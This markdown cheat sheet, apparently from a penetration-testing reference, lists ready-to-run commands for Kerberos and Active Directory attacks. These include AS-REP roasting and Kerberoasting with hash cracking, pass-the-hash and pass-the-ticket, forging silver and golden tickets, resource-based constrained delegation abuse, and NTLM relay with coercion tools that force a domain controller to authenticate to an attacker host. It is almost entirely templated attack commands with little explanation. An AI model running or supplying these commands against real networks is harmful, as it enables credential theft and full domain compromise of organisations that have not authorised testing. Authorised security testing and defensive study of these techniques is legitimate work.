---
title: Kerberos Attacks
category: active-directory
description: AS-REP roasting, Kerberoasting, delegation abuse, S4U.
tags: [kerberos, ad, kerberoast, asreproast, delegation]
os: [any]
order: 20
---

## AS-REP roasting (PreAuth not required)

```bash
# Linux
impacket-GetNPUsers {{DOMAIN}}/ -dc-ip {{RHOST}} -usersfile users.txt -no-pass -format hashcat -outputfile asrep.txt
nxc ldap {{RHOST}} -u "{{USER}}" -p 'pass' --asreproast asrep.txt

# Crack
hashcat -m 18200 asrep.txt rockyou.txt
```

## Kerberoasting

```bash
# Linux
impacket-GetUserSPNs {{DOMAIN}}/{{USER}}:'pass' -dc-ip {{RHOST}} -request -outputfile kerb.txt
nxc ldap {{RHOST}} -u "{{USER}}" -p 'pass' --kerberoasting kerb.txt

# Windows
Rubeus.exe kerberoast /nowrap /outfile:kerb.txt
setspn -T {{DOMAIN}} -Q */*

# Crack
hashcat -m 13100 kerb.txt rockyou.txt
```

## Pass-the-hash / pass-the-ticket / overpass

```bash
# Pass-the-hash
impacket-psexec -hashes :NTHASH {{DOMAIN}}/{{USER}}@{{RHOST}}
nxc smb {{RHOST}} -u "{{USER}}" -H NTHASH --local-auth
evil-winrm -i {{RHOST}} -u "{{USER}}" -H NTHASH

# Overpass-the-hash (get TGT from NT hash)
impacket-getTGT {{DOMAIN}}/{{USER}} -hashes :NTHASH
export KRB5CCNAME=$(pwd)/{{USER}}.ccache
impacket-psexec -k -no-pass {{DOMAIN}}/{{USER}}@host.{{DOMAIN}}

# Convert ccache <-> kirbi
impacket-ticketConverter ticket.ccache ticket.kirbi
```

## Silver / Golden tickets (with KRBTGT or service hash)

```bash
# Silver (service account NT hash → access that service)
impacket-ticketer -nthash SERVICE_NT -domain-sid S-1-5-... -domain {{DOMAIN}} -spn cifs/srv.{{DOMAIN}} {{USER}}

# Golden (krbtgt hash → arbitrary TGT as any user)
impacket-ticketer -nthash KRBTGT_NT -domain-sid S-1-5-... -domain {{DOMAIN}} Administrator

export KRB5CCNAME=$(pwd)/Administrator.ccache
impacket-psexec -k -no-pass {{DOMAIN}}/Administrator@dc.{{DOMAIN}}
```

## Unconstrained delegation

```powershell
# Find
Get-NetComputer -Unconstrained
# Coerce a DC to auth → captured TGT in LSASS → DCSync
```

## Constrained / RBCD

```bash
# Resource-Based Constrained Delegation (if you have GenericWrite on victim machine acct)
impacket-rbcd -delegate-from "attacker$" -delegate-to "VICTIM$" -dc-ip {{RHOST}} -action write {{DOMAIN}}/{{USER}}:'pass'
impacket-getST -spn cifs/victim.{{DOMAIN}} -impersonate Administrator -dc-ip {{RHOST}} {{DOMAIN}}/attacker\$:'pass'
```

## Coercion (NTLM relay setup)

```bash
impacket-ntlmrelayx -t ldaps://dc.{{DOMAIN}} --delegate-access --escalate-user attacker -smb2support
# In another shell:
python3 PetitPotam.py {{LHOST}} {{RHOST}}
python3 printerbug.py {{DOMAIN}}/{{USER}}:'pass'@{{RHOST}} {{LHOST}}
coercer coerce -u {{USER}} -p 'pass' -d {{DOMAIN}} -l {{LHOST}} -t {{RHOST}}
```
